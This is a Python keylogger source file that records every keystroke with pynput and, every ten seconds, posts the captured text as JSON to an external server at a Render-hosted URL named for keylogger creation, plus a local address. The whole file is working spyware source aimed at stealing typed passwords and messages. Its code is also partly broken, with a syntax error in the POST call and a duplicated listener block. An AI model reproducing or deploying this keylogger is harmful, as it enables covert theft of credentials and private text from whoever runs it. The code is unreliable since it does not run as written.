# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading

import socket
import requests
import json



# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""


def get_local_ip():
    """Find local IP dynamically."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn’t need to reach Google — just finds the right interface
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip


# Hard code the values of your server and ip address here.
ip_address = get_local_ip() 

port_number = "8080"
# Time interval in seconds for code to execute.

# Time interval in seconds for code to execute.
time_interval = 10


def send_data(data):
    local_ip = get_local_ip()
    #server_port = 3000
    url = f"http://{local_ip}:{port_number}"
    try:
        response = requests.post(url, json={"keyboardData": data})
        print(f"[DEBUG] Sent to {url} -> {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Could not connect to {url}: {e}")

# Example usage
send_data("Test dynamic IP")






def send_post_req():
    global text 
    try:
        payload = json.dumps({"keyboardData": text})
        url = f"http://{ip_address}:{port_number}"
        url ="https://keylogger-creation-1.onrender.com/"

        # debug: print what we are about to send and where
        print(f"[DEBUG] Sending payload to http://{ip_address}:{port_number} -> {payload!r}")
        print(f"[DEBUG] Sending payload to {url} -> {payload!r}")

        r = requests.post(
            url,
            
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=1000
            json={"keyboardData":text}
        )
        # Print status / body for debugging
        print(f"[DEBUG] POST response: {r.status_code} {r.reason}")
        try:
            print(f"[DEBUG] Response body: {r.text}")
        except Exception:
            pass

        # schedule next run
        timer = threading.Timer(time_interval, send_post_req)
        timer.daemon = True
        timer.start()
    except Exception as e:
        # show the real error for debugging (don't leave generic except in production)
        print("Couldn't complete request! Error:", repr(e))



# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()

if __name__ == "__main__":
    send_post_req()  # Start sending
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
